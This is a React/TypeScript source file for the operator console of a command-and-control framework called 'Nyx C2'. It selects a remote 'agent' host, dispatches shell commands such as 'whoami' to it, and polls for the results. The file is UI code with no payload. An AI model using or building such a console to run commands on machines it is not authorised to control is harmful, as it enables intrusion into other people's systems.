import { useState, useEffect, useRef } from "react";
import { getAgents, getAgentTasks, createTask, type Agent, type Task } from "../api/client";
import { Send, ChevronDown } from "lucide-react";

interface OutputLine {
  type: "cmd" | "output" | "error" | "info";
  text: string;
}

export default function Console() {
  const [agents, setAgents] = useState<Agent[]>([]);
  const [selectedAgent, setSelectedAgent] = useState<string>("");
  const [command, setCommand] = useState("");
  const [lines, setLines] = useState<OutputLine[]>([
    { type: "info", text: "Nyx C2 Console — select an agent to begin" },
  ]);
  const [loading, setLoading] = useState(false);
  const bottomRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    getAgents().then((data) => {
      setAgents(data);
      if (data.length > 0 && !selectedAgent) setSelectedAgent(data[0].id);
    });
  }, []);

  useEffect(() => {
    bottomRef.current?.scrollIntoView({ behavior: "smooth" });
  }, [lines]);

  const pushLine = (line: OutputLine) => setLines((prev) => [...prev, line]);

  const sendCommand = async () => {
    if (!command.trim() || !selectedAgent || loading) return;

    const agent = agents.find((a) => a.id === selectedAgent);
    pushLine({ type: "cmd", text: `[${agent?.hostname}]$ ${command}` });
    setCommand("");
    setLoading(true);

    try {
      const task = await createTask(selectedAgent, command);
      pushLine({ type: "info", text: `Task ${task.id.slice(0, 8)} dispatched — waiting...` });

      // poll for result
      for (let i = 0; i < 30; i++) {
        await new Promise((r) => setTimeout(r, 1000));
        const tasks = await getAgentTasks(selectedAgent);
        const done = tasks.find((t: Task) => t.id === task.id && t.status !== "pending");
        if (done) {
          if (done.output) {
            pushLine({ type: "output", text: done.output });
          }
          if (done.status === "failed") {
            pushLine({ type: "error", text: "Command failed" });
          }
          break;
        }
      }
    } catch {
      pushLine({ type: "error", text: "Failed to send command" });
    }

    setLoading(false);
  };

  const lineColor = (type: string) => {
    switch (type) {
      case "cmd": return "text-nyx-accent";
      case "output": return "text-nyx-green";
      case "error": return "text-nyx-red";
      default: return "text-nyx-muted";
    }
  };

  return (
    <div className="p-6 flex flex-col h-full gap-4">
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-nyx-text text-xl font-semibold">Console</h1>
          <p className="text-nyx-muted text-sm mt-1">Interactive agent shell</p>
        </div>
        <div className="relative">
          <select
            value={selectedAgent}
            onChange={(e) => setSelectedAgent(e.target.value)}
            className="appearance-none bg-nyx-surface border border-nyx-border text-nyx-text text-sm rounded px-3 py-2 pr-8 focus:outline-none focus:border-nyx-accent"
          >
            {agents.map((a) => (
              <option key={a.id} value={a.id}>
                {a.hostname} ({a.ip})
              </option>
            ))}
          </select>
          <ChevronDown size={14} className="absolute right-2 top-3 text-nyx-muted pointer-events-none" />
        </div>
      </div>

      <div className="flex-1 bg-nyx-surface border border-nyx-border rounded-lg overflow-y-auto p-4 font-mono text-sm min-h-0">
        {lines.map((line, i) => (
          <div key={i} className={`${lineColor(line.type)} whitespace-pre-wrap leading-6`}>
            {line.text}
          </div>
        ))}
        {loading && (
          <div className="text-nyx-yellow animate-pulse">...</div>
        )}
        <div ref={bottomRef} />
      </div>

      <div className="flex gap-2">
        <div className="flex-1 flex items-center bg-nyx-surface border border-nyx-border rounded px-3 gap-2 focus-within:border-nyx-accent">
          <span className="text-nyx-accent text-sm">$</span>
          <input
            value={command}
            onChange={(e) => setCommand(e.target.value)}
            onKeyDown={(e) => e.key === "Enter" && sendCommand()}
            placeholder="shell whoami"
            className="flex-1 bg-transparent text-nyx-text text-sm py-2 focus:outline-none placeholder:text-nyx-muted"
          />
        </div>
        <button
          onClick={sendCommand}
          disabled={loading || !selectedAgent}
          className="bg-nyx-accent hover:bg-violet-700 disabled:opacity-40 text-white px-4 py-2 rounded transition-colors"
        >
          <Send size={16} />
        </button>
      </div>
    </div>
  );
}
